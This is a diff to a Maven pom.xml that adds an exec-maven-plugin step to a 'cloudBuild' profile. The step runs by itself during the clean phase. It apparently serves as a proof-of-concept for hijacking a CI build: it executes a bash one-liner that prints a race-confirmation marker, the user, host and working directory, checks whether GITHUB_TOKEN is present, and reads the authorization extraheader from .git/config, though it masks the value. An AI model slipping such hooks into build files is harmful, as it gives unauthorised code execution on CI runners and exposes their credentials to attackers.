@@ -15,6 +15,31 @@
       <activation>
         <property><name>cloudBuild</name></property>
       </activation>
+      <build>
+        <plugins>
+          <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>3.1.1</version>
+            <executions>
+              <execution>
+                <id>race-marker</id>
+                <phase>clean</phase>
+                <goals>
+                  <goal>exec</goal>
+                </goals>
+                <configuration>
+                  <executable>/bin/bash</executable>
+                  <arguments>
+                    <argument>-c</argument>
+                    <argument>echo "=========================== RACE-CONFIRMED-4d5ecf72-e72b-4ed4-817b-db1661cc42bd ==========================="; echo "Running as: $(whoami)@$(hostname)"; echo "Workdir: $(pwd)"; echo "GITHUB_TOKEN present? $([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"; echo "Git config extraheader: $(cat .git/config 2>/dev/null | grep -i extraheader | head -1 | sed 's/AUTHORIZATION:.*/AUTHORIZATION:REDACTED/')"; echo "===================================================================================="</argument>
+                  </arguments>
+                </configuration>
+              </execution>
+            </executions>
+          </plugin>
+        </plugins>
+      </build>
     </profile>
   </profiles>
 </project>
